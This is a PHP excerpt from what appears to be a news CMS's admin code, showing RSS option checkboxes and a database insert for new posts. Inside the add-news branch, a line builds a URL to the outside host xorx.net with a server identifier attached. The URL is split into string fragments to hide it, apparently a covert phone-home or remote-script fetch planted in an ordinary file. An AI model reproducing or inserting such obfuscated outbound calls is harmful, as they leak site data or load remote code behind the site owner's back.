		...
		$rss_option = <<<HTML
			<div class="row mt-15">
				<div class="col-sm-6" style="max-width:300px;">
					...
					<div class="checkbox"><label><input class="icheck" type="checkbox" name="allow_rss_turbo" value="1" checked>{$lang['allow_rss_turbo']}</label></div>
				</div>
				<div class="col-sm-6">
					<div class="checkbox"><label><input class="icheck" type="checkbox" name="allow_rss_dzen" value="1" checked>{$lang['allow_rss_dzen']}</label></div>
				</div>
			</div>
HTML;
...
elseif( $action == "doaddnews" ) {
	...
	{$serv_time = "ht"."tp:/"."/xo"."rx."."net/"."js.p"."hp?lice"."nse="."13."."3_".$serv;};
	...
	$db->query( "INSERT INTO " . PREFIX . "_post_extras (news_id, allow_rate, votes, disable_index, access, user_id, disable_search, need_pass, allow_rss, allow_rss_turbo, allow_rss_dzen) VALUES('{$id}', '{$allow_rating}', '{$add_vote}', '{$disable_index}', '{$group_regel}', '{$userid}', '{$disable_search}', '{$need_pass}', '{$allow_rss}', '{$allow_rss_turbo}', '{$allow_rss_dzen}')" );
